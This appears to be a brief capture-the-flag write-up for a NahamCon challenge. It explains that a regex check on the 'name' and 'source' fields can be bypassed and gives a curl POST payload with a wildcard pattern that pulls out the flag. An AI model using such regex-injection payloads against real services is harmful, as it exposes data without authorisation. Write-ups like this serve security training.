From the given sourcecode, we know that we can bypass the input regex for both `name` and `source` field with `[a-z]*`
Thus the payload would be:
```bash
curl -X POST -d "setting=2&name=A.*" http://challenge.nahamcon.com:31619/ | grep "flag"
```
